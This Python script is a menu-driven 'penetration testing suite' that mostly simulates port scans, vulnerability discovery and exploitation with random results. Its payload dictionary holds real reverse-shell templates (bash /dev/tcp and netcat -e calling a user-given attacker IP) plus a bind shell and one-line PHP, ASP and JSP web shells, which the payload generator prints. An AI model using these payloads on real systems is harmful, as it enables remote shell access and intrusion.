#!/usr/bin/env python3
"""
DarkForce - Advanced Penetration Testing Suite
Created by BHAVYANSH SONI
A retro-style penetration testing and ethical hacking simulation tool
"""

import os
import sys
import time
import random
import socket
import threading
import subprocess
from datetime import datetime
from colorama import init, Fore, Back, Style
import base64
import hashlib

# Initialize colorama
init(autoreset=True)

def slow_print(text, delay=0.03):
    """Print text character by character with delay"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def print_header():
    """Print the program header with credits"""
    os.system('cls' if os.name == 'nt' else 'clear')
    header = f"""
{Fore.RED}{'='*60}
{Fore.MAGENTA}    ██████╗  █████╗ ██████╗ ██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗
{Fore.MAGENTA}    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
{Fore.MAGENTA}    ██║  ██║███████║██████╔╝█████╔╝ █████╗  ██║   ██║██████╔╝██║     █████╗  
{Fore.MAGENTA}    ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
{Fore.MAGENTA}    ██████╔╝██║  ██║██║  ██║██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
{Fore.MAGENTA}    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
{Fore.RED}{'='*60}
{Fore.YELLOW}    ⚔️ Advanced Penetration Testing Suite - Ethical Hacking
{Fore.MAGENTA}    🔴 Created by: BHAVYANSH SONI
{Fore.RED}{'='*60}
{Fore.YELLOW}    ⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
{Fore.RED}{'='*60}
"""
    print(header)

class PenTestFramework:
    """Penetration testing framework"""
    
    def __init__(self):
        self.target_systems = []
        self.discovered_vulnerabilities = []
        self.scan_results = {}
        self.exploit_modules = self.load_exploit_modules()
        self.payloads = self.load_payloads()
        
    def load_exploit_modules(self):
        """Load simulated exploit modules"""
        return {
            'web_exploits': [
                'SQL Injection Scanner',
                'XSS Vulnerability Finder',
                'Directory Traversal Tester',
                'File Upload Bypass',
                'Authentication Bypass',
                'Session Hijacking',
                'CSRF Token Bypass',
                'XXE Injection'
            ],
            'network_exploits': [
                'Buffer Overflow Exploit',
                'SMB Vulnerability Scanner',
                'FTP Anonymous Access',
                'Telnet Brute Force',
                'SSH Key Exploitation',
                'DNS Zone Transfer',
                'SNMP Community Scanner',
                'Port Knocking Detector'
            ],
            'wireless_exploits': [
                'WEP Key Cracker',
                'WPA Handshake Capture',
                'Evil Twin AP Setup',
                'WiFi Deauth Attack',
                'Bluetooth Scanner',
                'RFID Cloning Simulation',
                'GSM Base Station Spoof',
                'NFC Tag Cloning'
            ],
            'social_engineering': [
                'Phishing Email Generator',
                'Fake Login Page Creator',
                'USB Drop Attack Simulation',
                'Phone Call Pretexting',
                'Physical Access Simulation',
                'Tailgating Assessment',
                'Dumpster Diving Checklist',
                'OSINT Information Gathering'
            ]
        }
    
    def load_payloads(self):
        """Load payload templates"""
        return {
            'reverse_shell': {
                'bash': 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
                'python': 'python -c "import socket,subprocess,os;..."',
                'powershell': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient..."',
                'netcat': 'nc -e /bin/sh {ip} {port}'
            },
            'bind_shell': {
                'netcat': 'nc -lvp {port} -e /bin/sh',
                'python': 'python -c "import socket,subprocess,os;..."'
            },
            'web_shells': {
                'php': '<?php system($_GET["cmd"]); ?>',
                'asp': '<%eval request("cmd")%>',
                'jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
            }
        }
    
    def port_scanner(self, target, ports, scan_type='tcp'):
        """Advanced port scanner"""
        open_ports = []
        closed_ports = []
        filtered_ports = []
        
        slow_print(f"{Fore.YELLOW}🔍 Scanning {target} ({scan_type.upper()})...", 0.02)
        
        for port in ports:
            # Simulate different scan results
            result = random.choices(
                ['open', 'closed', 'filtered'],
                weights=[0.1, 0.8, 0.1],
                k=1
            )[0]
            
            if result == 'open':
                open_ports.append(port)
                service = self.identify_service(port)
                slow_print(f"{Fore.GREEN}Port {port}: OPEN ({service})", 0.01)
            elif result == 'filtered':
                filtered_ports.append(port)
            else:
                closed_ports.append(port)
            
            time.sleep(0.1)  # Simulate scan delay
        
        scan_result = {
            'target': target,
            'scan_type': scan_type,
            'open_ports': open_ports,
            'closed_ports': closed_ports,
            'filtered_ports': filtered_ports,
            'timestamp': datetime.now().isoformat()
        }
        
        self.scan_results[target] = scan_result
        return scan_result
    
    def identify_service(self, port):
        """Identify service running on port"""
        services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            135: 'RPC',
            139: 'NetBIOS',
            143: 'IMAP',
            443: 'HTTPS',
            445: 'SMB',
            993: 'IMAPS',
            995: 'POP3S',
            1433: 'MSSQL',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            8080: 'HTTP-Alt'
        }
        
        return services.get(port, 'Unknown')
    
    def vulnerability_scanner(self, target):
        """Scan for common vulnerabilities"""
        vulnerabilities = []
        
        # Simulate vulnerability discovery
        possible_vulns = [
            {'name': 'Outdated SSL/TLS Version', 'severity': 'Medium', 'cvss': 5.3},
            {'name': 'Weak Password Policy', 'severity': 'High', 'cvss': 7.5},
            {'name': 'Unpatched Software', 'severity': 'Critical', 'cvss': 9.8},
            {'name': 'Directory Listing Enabled', 'severity': 'Low', 'cvss': 3.7},
            {'name': 'Default Credentials', 'severity': 'Critical', 'cvss': 9.0},
            {'name': 'Cross-Site Scripting (XSS)', 'severity': 'Medium', 'cvss': 6.1},
            {'name': 'SQL Injection', 'severity': 'High', 'cvss': 8.2},
            {'name': 'Command Injection', 'severity': 'Critical', 'cvss': 9.6},
            {'name': 'Information Disclosure', 'severity': 'Medium', 'cvss': 5.0},
            {'name': 'Buffer Overflow', 'severity': 'High', 'cvss': 8.8}
        ]
        
        # Randomly select vulnerabilities
        num_vulns = random.randint(0, 5)
        found_vulns = random.sample(possible_vulns, num_vulns)
        
        for vuln in found_vulns:
            vuln['target'] = target
            vuln['discovered_at'] = datetime.now().isoformat()
            vulnerabilities.append(vuln)
            self.discovered_vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def exploit_simulator(self, vulnerability, target):
        """Simulate exploitation attempt"""
        exploit_success_rates = {
            'Low': 0.9,
            'Medium': 0.7,
            'High': 0.5,
            'Critical': 0.3
        }
        
        success_rate = exploit_success_rates.get(vulnerability['severity'], 0.5)
        success = random.random() < success_rate
        
        result = {
            'vulnerability': vulnerability['name'],
            'target': target,
            'success': success,
            'timestamp': datetime.now().isoformat(),
            'payload_used': self.select_payload(vulnerability),
            'access_level': self.determine_access_level() if success else None
        }
        
        return result
    
    def select_payload(self, vulnerability):
        """Select appropriate payload for vulnerability"""
        payload_mapping = {
            'SQL Injection': 'SQL injection payload',
            'Cross-Site Scripting (XSS)': 'XSS payload',
            'Command Injection': 'Command injection payload',
            'Buffer Overflow': 'Buffer overflow exploit',
            'Default Credentials': 'Credential enumeration'
        }
        
        return payload_mapping.get(vulnerability['name'], 'Generic exploit payload')
    
    def determine_access_level(self):
        """Determine level of access gained"""
        access_levels = ['User', 'Administrator', 'Root/System', 'Network Access']
        weights = [0.5, 0.3, 0.15, 0.05]
        
        return random.choices(access_levels, weights=weights, k=1)[0]
    
    def generate_report(self):
        """Generate penetration testing report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'targets_scanned': len(self.scan_results),
            'vulnerabilities_found': len(self.discovered_vulnerabilities),
            'critical_vulns': len([v for v in self.discovered_vulnerabilities if v['severity'] == 'Critical']),
            'high_vulns': len([v for v in self.discovered_vulnerabilities if v['severity'] == 'High']),
            'medium_vulns': len([v for v in self.discovered_vulnerabilities if v['severity'] == 'Medium']),
            'low_vulns': len([v for v in self.discovered_vulnerabilities if v['severity'] == 'Low']),
            'scan_results': self.scan_results,
            'vulnerabilities': self.discovered_vulnerabilities
        }
        
        return report

def display_scan_results(scan_result):
    """Display port scan results"""
    slow_print(f"\n{Fore.CYAN}📊 Scan Results for {scan_result['target']}", 0.02)
    slow_print(f"{Fore.YELLOW}{'='*60}", 0.01)
    
    slow_print(f"{Fore.GREEN}Open Ports: {Fore.WHITE}{len(scan_result['open_ports'])}", 0.02)
    slow_print(f"{Fore.RED}Closed Ports: {Fore.WHITE}{len(scan_result['closed_ports'])}", 0.02)
    slow_print(f"{Fore.YELLOW}Filtered Ports: {Fore.WHITE}{len(scan_result['filtered_ports'])}", 0.02)
    
    if scan_result['open_ports']:
        slow_print(f"\n{Fore.GREEN}Open Ports Details:", 0.02)
        for port in scan_result['open_ports']:
            service = PenTestFramework().identify_service(port)
            slow_print(f"  {Fore.CYAN}Port {port}: {Fore.WHITE}{service}", 0.02)

def display_vulnerabilities(vulnerabilities):
    """Display discovered vulnerabilities"""
    slow_print(f"\n{Fore.CYAN}🚨 Discovered Vulnerabilities", 0.02)
    slow_print(f"{Fore.YELLOW}{'='*80}", 0.01)
    
    if not vulnerabilities:
        slow_print(f"{Fore.GREEN}✅ No vulnerabilities found", 0.02)
        return
    
    severity_colors = {
        'Critical': Fore.MAGENTA,
        'High': Fore.RED,
        'Medium': Fore.YELLOW,
        'Low': Fore.GREEN
    }
    
    for vuln in vulnerabilities:
        color = severity_colors.get(vuln['severity'], Fore.WHITE)
        slow_print(f"{color}🔥 {vuln['name']} ({vuln['severity']})", 0.02)
        slow_print(f"   {Fore.WHITE}CVSS Score: {vuln['cvss']}", 0.02)
        slow_print(f"   {Fore.WHITE}Target: {vuln['target']}", 0.02)
        print()

def display_exploit_result(result):
    """Display exploitation result"""
    slow_print(f"\n{Fore.CYAN}⚔️ Exploitation Result", 0.02)
    slow_print(f"{Fore.YELLOW}{'─'*50}", 0.01)
    
    if result['success']:
        slow_print(f"{Fore.GREEN}✅ Exploitation SUCCESSFUL!", 0.02)
        slow_print(f"{Fore.CYAN}Access Level: {Fore.WHITE}{result['access_level']}", 0.02)
        slow_print(f"{Fore.CYAN}Payload: {Fore.WHITE}{result['payload_used']}", 0.02)
    else:
        slow_print(f"{Fore.RED}❌ Exploitation FAILED", 0.02)
        slow_print(f"{Fore.YELLOW}Target may be patched or protected", 0.02)

def display_exploit_modules(exploit_modules):
    """Display available exploit modules"""
    slow_print(f"\n{Fore.CYAN}⚔️ Available Exploit Modules", 0.02)
    slow_print(f"{Fore.YELLOW}{'='*60}", 0.01)
    
    for category, modules in exploit_modules.items():
        slow_print(f"\n{Fore.GREEN}{category.replace('_', ' ').title()}:", 0.02)
        for i, module in enumerate(modules, 1):
            slow_print(f"  {Fore.CYAN}{i}. {Fore.WHITE}{module}", 0.02)

def main():
    """Main function"""
    print_header()
    
    pentest = PenTestFramework()
    
    while True:
        slow_print(f"\n{Fore.CYAN}⚔️ DarkForce Menu:", 0.02)
        slow_print(f"{Fore.GREEN}1. {Fore.WHITE}Port Scanner", 0.02)
        slow_print(f"{Fore.GREEN}2. {Fore.WHITE}Vulnerability Scanner", 0.02)
        slow_print(f"{Fore.GREEN}3. {Fore.WHITE}Exploit Modules", 0.02)
        slow_print(f"{Fore.GREEN}4. {Fore.WHITE}Payload Generator", 0.02)
        slow_print(f"{Fore.GREEN}5. {Fore.WHITE}Exploit Simulator", 0.02)
        slow_print(f"{Fore.GREEN}6. {Fore.WHITE}Penetration Test Report", 0.02)
        slow_print(f"{Fore.GREEN}7. {Fore.WHITE}Social Engineering", 0.02)
        slow_print(f"{Fore.GREEN}8. {Fore.WHITE}Exit", 0.02)
        
        choice = input(f"\n{Fore.YELLOW}Select option (1-8): ").strip()
        
        if choice == '1':
            target = input(f"{Fore.YELLOW}Enter target IP/hostname: ").strip()
            if target:
                port_range = input(f"{Fore.YELLOW}Port range (e.g., 1-1000) or common: ").strip()
                
                if port_range.lower() == 'common':
                    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 3389]
                else:
                    try:
                        if '-' in port_range:
                            start, end = map(int, port_range.split('-'))
                            ports = list(range(start, min(end + 1, start + 100)))  # Limit to 100 ports
                        else:
                            ports = [int(port_range)]
                    except ValueError:
                        slow_print(f"{Fore.RED}❌ Invalid port range", 0.02)
                        continue
                
                scan_result = pentest.port_scanner(target, ports)
                display_scan_results(scan_result)
        
        elif choice == '2':
            target = input(f"{Fore.YELLOW}Enter target for vulnerability scan: ").strip()
            if target:
                slow_print(f"\n{Fore.YELLOW}🔍 Scanning {target} for vulnerabilities...", 0.02)
                time.sleep(3)
                
                vulnerabilities = pentest.vulnerability_scanner(target)
                display_vulnerabilities(vulnerabilities)
        
        elif choice == '3':
            display_exploit_modules(pentest.exploit_modules)
        
        elif choice == '4':
            slow_print(f"\n{Fore.CYAN}💉 Payload Generator", 0.02)
            slow_print(f"{Fore.GREEN}1. {Fore.WHITE}Reverse Shell", 0.02)
            slow_print(f"{Fore.GREEN}2. {Fore.WHITE}Bind Shell", 0.02)
            slow_print(f"{Fore.GREEN}3. {Fore.WHITE}Web Shell", 0.02)
            
            payload_choice = input(f"\n{Fore.YELLOW}Select payload type (1-3): ").strip()
            
            if payload_choice == '1':
                ip = input(f"{Fore.YELLOW}Attacker IP: ").strip()
                port = input(f"{Fore.YELLOW}Listen port: ").strip()
                
                if ip and port:
                    slow_print(f"\n{Fore.GREEN}Reverse Shell Payloads:", 0.02)
                    for lang, payload in pentest.payloads['reverse_shell'].items():
                        formatted_payload = payload.format(ip=ip, port=port)
                        slow_print(f"\n{Fore.CYAN}{lang.title()}:", 0.02)
                        slow_print(f"{Fore.WHITE}{formatted_payload}", 0.02)
            
            elif payload_choice == '2':
                port = input(f"{Fore.YELLOW}Bind port: ").strip()
                
                if port:
                    slow_print(f"\n{Fore.GREEN}Bind Shell Payloads:", 0.02)
                    for lang, payload in pentest.payloads['bind_shell'].items():
                        formatted_payload = payload.format(port=port)
                        slow_print(f"\n{Fore.CYAN}{lang.title()}:", 0.02)
                        slow_print(f"{Fore.WHITE}{formatted_payload}", 0.02)
            
            elif payload_choice == '3':
                slow_print(f"\n{Fore.GREEN}Web Shell Payloads:", 0.02)
                for lang, payload in pentest.payloads['web_shells'].items():
                    slow_print(f"\n{Fore.CYAN}{lang.upper()}:", 0.02)
                    slow_print(f"{Fore.WHITE}{payload}", 0.02)
        
        elif choice == '5':
            if not pentest.discovered_vulnerabilities:
                slow_print(f"{Fore.YELLOW}⚠️ No vulnerabilities found. Run vulnerability scanner first.", 0.02)
                continue
            
            slow_print(f"\n{Fore.CYAN}Available Vulnerabilities:", 0.02)
            for i, vuln in enumerate(pentest.discovered_vulnerabilities, 1):
                slow_print(f"{Fore.GREEN}{i}. {vuln['name']} ({vuln['severity']}) - {vuln['target']}", 0.02)
            
            try:
                vuln_choice = int(input(f"\n{Fore.YELLOW}Select vulnerability to exploit (1-{len(pentest.discovered_vulnerabilities)}): ").strip()) - 1
                if 0 <= vuln_choice < len(pentest.discovered_vulnerabilities):
                    vuln = pentest.discovered_vulnerabilities[vuln_choice]
                    
                    slow_print(f"\n{Fore.YELLOW}⚔️ Attempting to exploit {vuln['name']}...", 0.02)
                    time.sleep(2)
                    
                    result = pentest.exploit_simulator(vuln, vuln['target'])
                    display_exploit_result(result)
                else:
                    slow_print(f"{Fore.RED}❌ Invalid vulnerability choice", 0.02)
            except ValueError:
                slow_print(f"{Fore.RED}❌ Invalid input", 0.02)
        
        elif choice == '6':
            report = pentest.generate_report()
            
            slow_print(f"\n{Fore.CYAN}📋 Penetration Testing Report", 0.02)
            slow_print(f"{Fore.YELLOW}{'='*60}", 0.01)
            slow_print(f"{Fore.GREEN}Report Generated: {Fore.WHITE}{report['timestamp'][:19]}", 0.02)
            slow_print(f"{Fore.GREEN}Targets Scanned: {Fore.WHITE}{report['targets_scanned']}", 0.02)
            slow_print(f"{Fore.GREEN}Vulnerabilities Found: {Fore.WHITE}{report['vulnerabilities_found']}", 0.02)
            
            slow_print(f"\n{Fore.YELLOW}Vulnerability Breakdown:", 0.02)
            slow_print(f"{Fore.MAGENTA}Critical: {report['critical_vulns']}", 0.02)
            slow_print(f"{Fore.RED}High: {report['high_vulns']}", 0.02)
            slow_print(f"{Fore.YELLOW}Medium: {report['medium_vulns']}", 0.02)
            slow_print(f"{Fore.GREEN}Low: {report['low_vulns']}", 0.02)
            
            if report['vulnerabilities_found'] > 0:
                risk_score = (report['critical_vulns'] * 4 + report['high_vulns'] * 3 + 
                             report['medium_vulns'] * 2 + report['low_vulns'] * 1)
                
                if risk_score >= 10:
                    risk_level = "CRITICAL"
                    risk_color = Fore.MAGENTA
                elif risk_score >= 7:
                    risk_level = "HIGH"
                    risk_color = Fore.RED
                elif risk_score >= 4:
                    risk_level = "MEDIUM"
                    risk_color = Fore.YELLOW
                else:
                    risk_level = "LOW"
                    risk_color = Fore.GREEN
                
                slow_print(f"\n{Fore.GREEN}Overall Risk Level: {risk_color}{risk_level}", 0.02)
        
        elif choice == '7':
            slow_print(f"\n{Fore.CYAN}👥 Social Engineering Toolkit", 0.02)
            
            se_modules = pentest.exploit_modules['social_engineering']
            for i, module in enumerate(se_modules, 1):
                slow_print(f"{Fore.GREEN}{i}. {Fore.WHITE}{module}", 0.02)
            
            try:
                se_choice = int(input(f"\n{Fore.YELLOW}Select module (1-{len(se_modules)}): ").strip()) - 1
                if 0 <= se_choice < len(se_modules):
                    module = se_modules[se_choice]
                    slow_print(f"\n{Fore.YELLOW}🎭 Launching {module}...", 0.02)
                    time.sleep(2)
                    
                    if 'Email' in module:
                        slow_print(f"{Fore.GREEN}✅ Phishing email template generated", 0.02)
                        slow_print(f"{Fore.CYAN}Subject: Urgent: Verify Your Account", 0.02)
                        slow_print(f"{Fore.WHITE}Template includes social engineering tactics", 0.02)
                    elif 'Login' in module:
                        slow_print(f"{Fore.GREEN}✅ Fake login page created", 0.02)
                        slow_print(f"{Fore.CYAN}Mimics target organization's login portal", 0.02)
                    elif 'OSINT' in module:
                        slow_print(f"{Fore.GREEN}✅ OSINT information gathered", 0.02)
                        slow_print(f"{Fore.CYAN}Found social media profiles, email addresses", 0.02)
                    else:
                        slow_print(f"{Fore.GREEN}✅ {module} simulation completed", 0.02)
                else:
                    slow_print(f"{Fore.RED}❌ Invalid module choice", 0.02)
            except ValueError:
                slow_print(f"{Fore.RED}❌ Invalid input", 0.02)
        
        elif choice == '8':
            slow_print(f"\n{Fore.YELLOW}👋 Thanks for using DarkForce! Hack ethically!", 0.03)
            break
        
        else:
            slow_print(f"{Fore.RED}❌ Invalid choice. Please try again.", 0.02)
        
        if choice != '8':
            slow_print(f"\n{Fore.MAGENTA}Press Enter to continue...", 0.02)
            input()
            print_header()

if __name__ == "__main__":
    main()
